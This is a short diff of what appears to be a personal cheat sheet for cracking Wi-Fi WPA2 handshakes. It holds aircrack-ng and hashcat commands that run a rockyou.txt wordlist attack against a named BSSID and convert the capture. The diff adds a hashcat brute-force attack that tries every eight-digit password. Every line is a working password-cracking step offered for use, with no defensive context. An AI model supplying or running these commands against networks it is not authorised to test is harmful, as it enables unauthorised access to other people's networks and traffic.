@@ -60,5 +60,8 @@ aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap
 # convert cap to hccapx
 cap2hccapx.bin .-01.cap example.hccapx
 
-# crack with hashcat
+# crack with hashcat for wordlist
 hashcat -w 3 -m 2500 rockyou.txt example.hccapx  --force --self-test-disable
+
+# crack with hashcat for bruteforche
+ hashcat -w 3 -m 2500 -a 3 manos.hccapx ?d?d?d?d?d?d?d?d --force --self-test-disable
